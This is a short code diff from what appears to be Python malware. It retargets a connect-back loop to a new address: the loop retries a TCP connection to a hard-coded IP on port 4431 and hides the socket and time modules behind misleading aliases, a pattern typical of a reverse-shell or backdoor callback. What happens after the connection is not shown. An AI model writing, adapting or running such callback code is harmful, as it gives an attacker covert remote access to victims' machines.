@@ -92,7 +92,7 @@ def search(hello, key):
 for counter in range(8):
     try:
         dothemath = securzy.socket(2, securzy.SOCK_STREAM)
-        dothemath.connect(('192.168.142.14', 4431))
+        dothemath.connect(('192.168.8.128', 4431))
         break
     except:
         cisco.sleep(5)
